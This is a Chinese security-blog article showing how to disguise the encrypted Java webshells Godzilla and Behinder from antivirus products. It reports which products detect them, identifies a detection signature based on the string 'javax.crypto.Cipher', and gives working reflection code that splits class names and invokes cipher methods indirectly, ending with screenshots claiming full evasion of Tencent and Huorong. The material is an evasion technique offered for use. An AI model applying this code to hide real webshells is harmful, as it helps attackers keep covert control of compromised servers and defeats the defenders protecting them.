# 利用Java反射实现加密型webshell的免杀

阅读量 **226433**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-20 15:30:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0176f85e7dc64e648e.jpg)

本文以哥斯拉和冰蝎为例，讲解如何使用反射机制来实现加密型webshell的免杀。

## 0x01 基础知识

反射是Java的一种动态特征。反射的存在可以让运行中的Java程序能够获取自身的信息，并且可以操作对象或者类的内部属性。简单来说，通过反射，我们可以在运行时获取程序集中每一个类型的成员或者成员信息。  
下面简单介绍以下本次用到类和的方法：

####  java.lang.Class类：

反射中的字节码对象，可以通过对象来获取，也可以通过对应类型的class变量获取，或者根据下面的forName方法获取。

![](https://p3.ssl.qhimg.com/t01adf1c75e85327e18.png)

####  forName方法

![](https://p3.ssl.qhimg.com/t0121d79e09978776c4.png)

####  java.lang.reflect.Method 类

反射中的方法对象，可以通过对象来获取，也可以通过对应类型的class变量获取。

####  getMethod方法

返回某一个类的特方法，该方法的第一个参数为方法名，后面的参数为该方法的参数对应的class对象。

####  invoke方法

对一个方法进行调用，第一个参数为调用此方法的对象，后面的参数为该方法的参数

![](https://p0.ssl.qhimg.com/t01668817f906f9f2e2.png)

## 0x02 哥斯拉的免杀情况测试

经过测试，未经处理的哥斯拉木马可以绕过的杀软有Windows Defender和360杀毒

####  Windows Defender

![](https://p0.ssl.qhimg.com/t01a55efca1a8253119.png)

####  腾讯管家

![](https://p3.ssl.qhimg.com/t01370552f59a20a8fe.png)

####  火绒杀毒

![](https://p1.ssl.qhimg.com/t019b9a5a2096a18e44.png)

经过分析，发现火绒目前是通过分析文件特征中的特定字符串来确认木马的。

哥斯拉/冰蝎是加密木马，从payload到待执行的命令都是经过加密的，传统的基于命令执行的检测方法解基本都失效了。因此火绒杀毒采用了检测木马中是否存在”javax.crypto.Cipher”这一关键类来作为判断是否存在加密木马的关键依据。

关于这一点我们可以将Cipher关键字修改成其他的（当然这样的木马是不能执行的），即可验证我们的推断。（PS： **这一点同样适用于冰蝎** ）

####  修改前：

![](https://p5.ssl.qhimg.com/t010b8a8c96aac3bbd0.png)

####  修改后：

![](https://p4.ssl.qhimg.com/t0107075f0aa7b0fd6d.png)

## 0x03 利用反射将重写关键代码

由0x02中的结论得出，我们要重写的是如下部分的代码中x方法的方法体，我们保留方法的定义和参数，保留原有的try –
catch结构，将里面的高亮的代码删除：

![](https://p4.ssl.qhimg.com/t01f5a53bd9ad39d49a.png)

首先使用Class.forName方法加载Cipher类，防止其被检测到

    
    
    String xo = "java"+"x.crypto.C"+"ipher";//字符串拆成三段防止被静态检测
    Class ci = Class.forName(xo);
    

然后下一步则是通过getMethod方法来获取getInstance方法，用于初始化Cipher对象,同时使用invoke方法调用getInstance(“ASE”)；

    
    
    String xo = "java"+"x.crypto.C"+"ipher";
    Class ci = Class.forName(xo);
    java.lang.reflect.Method g = ci.getMethod("getInstance", String.class);
    Object c = ci.cast(g.invoke((null),"A"+"ES"));
    

PS:
可能有师傅会对第4行代码产生疑问，getInstance返回的不应该是Cipher对象吗，为啥还要强制转换？强制转换成Cipher之后为啥又要定义成Object类？有必要这样来回套娃吗？  
答：这里是Java多态性的一种动态体现，背过Java面试八股文的师傅应该有所了解，这里用一段代码来简单解释：

![](https://p2.ssl.qhimg.com/t01d7e5e4b4afea08d6.png)

B是A的子类，虽然变量b被定义A类型，但是调用getA_Filed的方法时仍然调用了重载后的方法。  
回到我们的木马中，第四行的invoke方法，相当于返回了一个经过向上转型为Object类对象的Cipher对象，需要经过一次向下转型之后才能成为Cipher对象，但是为了避免再一次在我们的木马中出现”Cipher”这一关键字，我们仍然使用其父类的定义，但是不影响其方法的调用。  
）  
现在我们绕开了Cipher这个关键词，获取了一个Cipher对象，接下来我们用invoke来重写加密和返回的过程

    
    
    String xo = "java"+"x.crypto.C"+"ipher";
    Class ci = Class.forName(xo);
    java.lang.reflect.Method g = ci.getMethod("getInstance", String.class);
    Object c = ci.cast(g.invoke((null),"A"+"ES"));
    ci.getMethod("init",int.class,java.security.Key.class).invoke(c,m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
    return (byte[]) c.getClass().getMethod("doFinal",byte[].class).invoke(c,s);
    

注意：虽然变量c是属于Cipher类，但是在编译为字节码的过程中仍然会把c作为Object来处理，而init方法在Object中没有定义，所以我们要再次使用invoke方法来调用init方法。  
这样我们的改造工作就完成了。  
使用哥斯拉进行连接测试，发现完美执行：

![](https://p3.ssl.qhimg.com/t01f5d42747ac53e532.png)

## 0x04 免杀情况测试

可以完美绕过腾讯安全管家和火绒杀毒

![](https://p0.ssl.qhimg.com/t010262f6f8b5c6918b.png)

![](https://p3.ssl.qhimg.com/t015892324a7ae58f7f.png)

## 0x05 References

1)《Java代码审计入门篇》 人民邮电出版社  
2) 基于污点分析的webshell检测 <https://xz.aliyun.com/t/10622#toc-4>  
3) Java基础（多态的理解与应用)
<https://blog.csdn.net/qq_41679818/article/details/90523285>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一桶猫与六只鱼** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/264628](/post/id/264628)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [Java](/tag/Java)
  * [webshell](/tag/webshell)
  * [免杀](/tag/免杀)

 **+1** __8赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) 一桶猫与六只鱼

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

